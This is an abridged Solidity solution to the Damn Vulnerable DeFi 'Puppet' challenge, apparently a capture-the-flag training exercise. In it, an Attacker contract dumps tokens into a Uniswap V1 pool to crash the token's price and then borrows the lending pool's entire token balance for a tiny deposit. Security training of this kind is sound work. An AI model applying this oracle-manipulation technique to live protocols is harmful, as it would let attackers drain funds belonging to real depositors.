...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        console.log("dex balance before swap", address(uniswapV1Exchange).balance);

        Attacker attacker = new Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange);
        token.transfer(address(attacker), token.balanceOf(player));
        attacker.attack(recovery);

        console.log("dex balance after swap", address(uniswapV1Exchange).balance);
        console.log("deposit required", lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
...
contract Attacker {
    ...
    IUniswapV1Exchange internal _uniswapV1Exchange;

    constructor(DamnValuableToken token, PuppetPool lendingPool, IUniswapV1Exchange uniswapV1Exchange) payable {
        _token = token;
        _lendingPool = lendingPool;
        _uniswapV1Exchange = uniswapV1Exchange;
    }

    function attack(address recipient) external {
        _token.approve(address(_uniswapV1Exchange), _token.balanceOf(address(this)));
        uint256 amount = _token.balanceOf(address(this));

        _uniswapV1Exchange.tokenToEthTransferInput(amount, 9, block.timestamp, address(this));

        _lendingPool.borrow{value: address(this).balance}(_token.balanceOf(address(_lendingPool)), recipient);
    }
